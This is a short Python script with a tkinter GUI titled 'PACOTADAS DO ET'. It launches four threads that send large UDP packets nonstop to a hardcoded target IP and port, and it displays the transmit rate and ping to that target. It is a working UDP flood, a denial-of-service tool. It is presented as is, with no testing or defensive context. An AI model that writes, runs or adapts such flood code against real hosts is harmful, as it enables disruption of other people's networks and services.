import tkinter as tk
import threading
import psutil
import time
import subprocess
import socket

# === CONFIGURAÇÃO ===
TARGET_IP     = "8.8.8.8"    # IP para ping e flood
TARGET_PORT   = 80           # Porta UDP para flood
BUFFER_SIZE   = 4248        # Payload UDP sem fragmentação
FLOOD_THREADS = 4            # Threads paralelas de flood
IFACE_NAME    = "Ethernet"   # Nome exato da interface

# === FUNÇÃO DE FLOOD UDP ===
def flood_packets():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = b"A" * BUFFER_SIZE
    while True:
        try:
            sock.sendto(data, (TARGET_IP, TARGET_PORT))
        except:
            time.sleep(0.1)

# === FUNÇÃO DE PING ===
def get_ping(ip):
    try:
        out = subprocess.run(
            ["ping", "-n", "1", ip],
            capture_output=True, text=True, timeout=2
        ).stdout
        for line in out.splitlines():
            if "tempo=" in line or "time=" in line:
                return (line.split("tempo=")[-1] if "tempo=" in line else line.split("time=")[-1]).split()[0]
    except:
        return "Err"
    return "T/o"

# === LOOP DE MONITORAMENTO ===
def monitor_iface():
    prev = psutil.net_io_counters(pernic=True).get(IFACE_NAME)
    if not prev:
        status_var.set(f"Interface '{IFACE_NAME}' não encontrada")
        return
    prev_sent = prev.bytes_sent

    while True:
        time.sleep(1)
        stats = psutil.net_io_counters(pernic=True).get(IFACE_NAME)
        curr_sent = stats.bytes_sent
        delta = curr_sent - prev_sent
        prev_sent = curr_sent

        mbps = (delta * 8) / 1_000_000  # converte pra megabits/s
        ping = get_ping(TARGET_IP)
        status_var.set(f"TX: {mbps:.1f} Mbps    Ping: {ping}")

# === MONTE A GUI ===
root = tk.Tk()
root.title("PACOTADAS DO ET")
root.geometry("400x150")
root.resizable(False, False)
root.configure(bg="black")

tk.Label(
    root,
    text="PACOTADAS DO ET",
    font=("Helvetica", 24, "bold"),
    fg="lime",
    bg="black"
).pack(pady=10)

status_var = tk.StringVar(value="Inicializando...")
tk.Label(
    root,
    textvariable=status_var,
    font=("Consolas", 16),
    fg="white",
    bg="black"
).pack()

# === INICIA THREADS ===
for _ in range(FLOOD_THREADS):
    threading.Thread(target=flood_packets, daemon=True).start()

threading.Thread(target=monitor_iface, daemon=True).start()

root.mainloop()
